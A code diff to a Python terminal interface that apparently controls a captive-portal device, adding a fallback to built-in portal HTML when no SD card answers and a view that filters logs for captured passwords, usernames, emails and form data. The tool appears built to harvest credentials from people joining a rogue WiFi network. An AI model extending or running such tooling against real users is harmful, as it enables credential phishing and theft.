@@ -29,6 +29,9 @@ class PortalScreen(urwid.WidgetWrap):
     - [s] start setup wizard
     - [Esc/x] stop portal
     - [d] show captured data
+
+    If no SD card / no HTML files found, uses firmware's built-in default
+    portal page automatically.
     """
 
     def __init__(self, state: AppState, serial: SerialManager, app,
@@ -62,6 +65,7 @@ class PortalScreen(urwid.WidgetWrap):
         self._html_files: list[dict] = []
         self._fetch_lines: list[str] = []
         self._fetching_files = False
+        self._file_load_timeout = None
 
     def refresh(self) -> None:
         if self.state.portal_running:
@@ -148,11 +152,30 @@ class PortalScreen(urwid.WidgetWrap):
     def _load_html_files(self) -> None:
         self._fetching_files = True
         self._fetch_lines = []
-        self._status.set_text(("warning", "  Loading HTML files from SD card..."))
+        self._status.set_text(("warning", "  Checking SD card for HTML files..."))
         self.serial.send_command(CMD_LIST_SD)
+        # Timeout: if no response in 3 seconds, assume no SD card
+        loop = self._app._loop
+        if loop:
+            self._file_load_timeout = loop.set_alarm_in(
+                3.0, lambda *_: self._sd_timeout()
+            )
+
+    def _sd_timeout(self) -> None:
+        """Called if SD card doesn't respond — use default HTML."""
+        if not self._fetching_files:
+            return
+        self._fetching_files = False
+        self._file_load_timeout = None
+        self._confirm_start_default()
 
     def _finish_file_load(self) -> None:
         self._fetching_files = False
+        # Cancel timeout if pending
+        if self._file_load_timeout and self._app._loop:
+            self._app._loop.remove_alarm(self._file_load_timeout)
+            self._file_load_timeout = None
+
         self._html_files = []
         for line in self._fetch_lines:
             if re.search(r"^\s*\d+\s+\S+\.html\s*$", line):
@@ -161,7 +184,8 @@ class PortalScreen(urwid.WidgetWrap):
                     self._html_files.append({"number": parts[0], "name": parts[1]})
 
         if not self._html_files:
-            self._status.set_text(("error", "  No HTML files found on SD card"))
+            # No SD card or no HTML files — use firmware default
+            self._confirm_start_default()
             return
 
         # Show file picker overlay
@@ -181,6 +205,23 @@ class PortalScreen(urwid.WidgetWrap):
 
         picker = FilePicker(names, on_pick)
         self._app.show_overlay(picker, 50, min(len(names) + 6, 20))
+
+    def _confirm_start_default(self) -> None:
+        """Confirm start with firmware's built-in default portal HTML."""
+        from ..widgets.confirm_dialog import ConfirmDialog
+
+        self.state.selected_html_name = "(default)"
+        msg = f"Start portal? SSID={self._ssid} (using built-in HTML)"
+
+        def on_confirm(yes):
+            self._app.dismiss_overlay()
+            if not yes:
+                self._status.set_text(("dim", "  Portal start cancelled"))
+                return
+            self._do_start()
+
+        dialog = ConfirmDialog(msg, on_confirm)
+        self._app.show_overlay(dialog, 60, 8)
 
     def _confirm_start(self) -> None:
         from ..widgets.confirm_dialog import ConfirmDialog
@@ -228,4 +269,13 @@ class PortalScreen(urwid.WidgetWrap):
         if not self.state.portal_log:
             self._status.set_text(("dim", "  No captured data yet"))
             return
-        self.serial.send_command(CMD_SHOW_PASS)
+        # Show data from local log (show_pass requires SD card)
+        self._body.original_widget = self._log
+        pw_lines = [l for l in self.state.portal_log
+                     if any(kw in l.lower() for kw in ("password:", "form data:", "username:", "email:"))]
+        if pw_lines:
+            self._log.append("=== Captured Data ===", "success")
+            for pl in pw_lines:
+                self._log.append(mask_line(pl), "success")
+        else:
+            self._log.append("No passwords/forms captured yet", "dim")
